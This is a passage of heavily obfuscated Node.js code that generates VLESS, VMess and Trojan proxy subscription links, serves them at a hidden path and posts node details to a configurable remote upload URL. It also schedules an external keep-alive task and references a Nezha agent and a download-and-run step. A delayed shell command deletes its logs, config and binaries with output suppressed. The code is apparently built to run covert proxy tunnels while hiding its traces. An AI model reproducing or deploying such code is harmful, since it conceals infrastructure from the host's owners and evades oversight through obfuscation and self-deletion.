_0x20e7ff={_0x5bb8ac:0x22b,_0x307d64:0x1dd},_0x57756a=_0x5380,_0x2facab={'v':'2','ps':''+_0x4b19f1,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x57756a(0x1ed),'net':'ws','type':_0x57756a(0x1ed),'host':_0x19a0fe,'path':_0x57756a(0x1b1),'tls':_0x57756a(_0xd13d1a._0x3dc0cc),'sni':_0x19a0fe,'alpn':'','fp':'firefox'},_0x47a626=_0x57756a(_0xd13d1a._0x40a1ca)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x19a0fe+_0x57756a(0x1a8)+_0x19a0fe+_0x57756a(_0xd13d1a._0x938901)+_0x4b19f1+_0x57756a(0x22a)+Buffer[_0x57756a(0x22b)](JSON[_0x57756a(_0xd13d1a._0x465ec6)](_0x2facab))[_0x57756a(0x1d5)](_0x57756a(0x1f7))+_0x57756a(0x23b)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x19a0fe+_0x57756a(0x1a8)+_0x19a0fe+_0x57756a(0x1f3)+_0x4b19f1+_0x57756a(0x230);console['log'](Buffer[_0x57756a(0x22b)](_0x47a626)[_0x57756a(_0xd13d1a._0x1fce22)]('base64')),fs[_0x57756a(_0xd13d1a._0x155a3e)](subPath,Buffer[_0x57756a(0x22b)](_0x47a626)[_0x57756a(_0xd13d1a._0x77df86)](_0x57756a(_0xd13d1a._0x4ae6a6))),console[_0x57756a(_0xd13d1a._0x432d89)](FILE_PATH+_0x57756a(0x248)),uploadNodes(),app[_0x57756a(_0xd13d1a._0x556397)]('/'+SUB_PATH,(_0x435c32,_0x5aafa9)=>{const _0x5f2b58=_0x57756a,_0xd88748=Buffer[_0x5f2b58(_0x20e7ff._0x5bb8ac)](_0x47a626)[_0x5f2b58(0x1d5)](_0x5f2b58(0x1f7));_0x5aafa9['set']('Content-Type',_0x5f2b58(_0x20e7ff._0x307d64)),_0x5aafa9[_0x5f2b58(0x1de)](_0xd88748);}),_0x1b6808(_0x47a626);},0x7d0);});}}async function uploadNodes(){const _0xa88edc={_0x2a6446:0x1ac,_0x34ca0b:0x222,_0x1ec4cf:0x242,_0x3dd4cf:0x1ab,_0x18bfcc:0x224,_0x410315:0x1d1,_0x54f834:0x1aa,_0x1b8cb4:0x20a,_0x5918c4:0x1ec,_0x2e9ff3:0x1ac,_0x144f2b:0x1cb,_0x177871:0x1a3},_0x55de42=_0x1b1022;if(UPLOAD_URL&&PROJECT_URL){const _0x550c9e=PROJECT_URL+'/'+SUB_PATH,_0x3c4232={'subscription':[_0x550c9e]};try{const _0x219d4b=await axios[_0x55de42(_0xa88edc._0x2a6446)](UPLOAD_URL+_0x55de42(_0xa88edc._0x34ca0b),_0x3c4232,{'headers':{'Content-Type':_0x55de42(0x1cb)}});return _0x219d4b&&_0x219d4b[_0x55de42(_0xa88edc._0x1ec4cf)]===0xc8?(console[_0x55de42(_0xa88edc._0x3dd4cf)]('Subscription\x20uploaded\x20successfully'),_0x219d4b):null;}catch(_0x2acaa3){if(_0x2acaa3[_0x55de42(_0xa88edc._0x18bfcc)]){if(_0x2acaa3[_0x55de42(0x224)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x1fe62a=fs[_0x55de42(_0xa88edc._0x410315)](listPath,'utf-8'),_0x35e8f2=_0x1fe62a[_0x55de42(0x1d4)]('\x0a')[_0x55de42(_0xa88edc._0x54f834)](_0x252f98=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x55de42(0x1a9)](_0x252f98));if(_0x35e8f2[_0x55de42(_0xa88edc._0x1b8cb4)]===0x0)return;const _0x16ec3b=JSON[_0x55de42(_0xa88edc._0x5918c4)]({'nodes':_0x35e8f2});try{const _0x4c177e=await axios[_0x55de42(_0xa88edc._0x2e9ff3)](UPLOAD_URL+'/api/add-nodes',_0x16ec3b,{'headers':{'Content-Type':_0x55de42(_0xa88edc._0x144f2b)}});return _0x4c177e&&_0x4c177e[_0x55de42(0x242)]===0xc8?(console[_0x55de42(0x1ab)](_0x55de42(_0xa88edc._0x177871)),_0x4c177e):null;}catch(_0x3bea09){return null;}}else return;}}function _0x5380(_0x5ee0cb,_0x572e5c){const _0x2baf1d=_0x2baf();return _0x5380=function(_0x5380f3,_0x21dc45){_0x5380f3=_0x5380f3-0x19e;let _0x18ee29=_0x2baf1d[_0x5380f3];return _0x18ee29;},_0x5380(_0x5ee0cb,_0x572e5c);}function cleanFiles(){const _0x259665={_0x3c71b3:0x19e,_0x2ccab8:0x20c,_0x1be5ff:0x21a,_0x3a3026:0x1b9,_0x4347bb:0x21a},_0x52deba={_0x1d576d:0x24d,_0x5cfe19:0x1ab,_0x4cf139:0x209,_0x1d8882:0x1e3};setTimeout(()=>{const _0x54f7a8={_0x2673fb:0x24d,_0x23cb59:0x1e3},_0x3f4048=_0x5380,_0x4b9e0c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4b9e0c[_0x3f4048(_0x259665._0x3c71b3)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4b9e0c[_0x3f4048(0x19e)](phpPath);process[_0x3f4048(_0x259665._0x2ccab8)]===_0x3f4048(0x235)?exec('del\x20/f\x20/q\x20'+_0x4b9e0c[_0x3f4048(_0x259665._0x1be5ff)]('\x20')+_0x3f4048(_0x259665._0x3a3026),_0x3898db=>{const _0x30d6a4=_0x3f4048;console[_0x30d6a4(_0x54f7a8._0x2673fb)](),console[_0x30d6a4(0x1ab)](_0x30d6a4(0x209)),console[_0x30d6a4(0x1ab)](_0x30d6a4(_0x54f7a8._0x23cb59));}):exec(_0x3f4048(0x1c4)+_0x4b9e0c[_0x3f4048(_0x259665._0x4347bb)]('\x20')+'\x20>/dev/null\x202>&1',_0x11e27e=>{const _0x333ebc=_0x3f4048;console[_0x333ebc(_0x52deba._0x1d576d)](),console[_0x333ebc(_0x52deba._0x5cfe19)](_0x333ebc(_0x52deba._0x4cf139)),console[_0x333ebc(0x1ab)](_0x333ebc(_0x52deba._0x1d8882));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xe0242c={_0x3cf3eb:0x1ab,_0x4c10be:0x1ac,_0x34db37:0x22d},_0x255646=_0x1b1022;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x255646(_0xe0242c._0x3cf3eb)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x375757=await axios[_0x255646(_0xe0242c._0x4c10be)](_0x255646(0x23e),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x255646(0x1cb)}});return console['log'](_0x255646(_0xe0242c._0x34db37)),_0x375757;}catch(_0x3d0ad9){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x3d0ad9[_0x255646(0x243)]),null;}}async function startserver(){const _0x3871ad={_0xc2266:0x1da,_0x9320b7:0x1e1},_0x32e7e3=_0x1b1022;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x400d6e){console[_0x32e7e3(_0x3871ad._0xc2266)](_0x32e7e3(_0x3871ad._0x9320b7),_0x400d6e);}}startserver()[_0x1b1022(0x1a6)](_0x1f6fd1=>{const _0x35f7bd={_0x5610bf:0x1da,_0x15f4b8:0x1fa},_0x5c9055=_0x1b1022;console[_0x5c9055(_0x35f7bd._0x5610bf)](_0x5c9055(_0x35f7bd._0x15f4b8),_0x1f6fd1);}),app['listen'](PORT,()=>console[_0x1b1022(0x1ab)](_0x1b1022(0x247)+PORT+'!'));
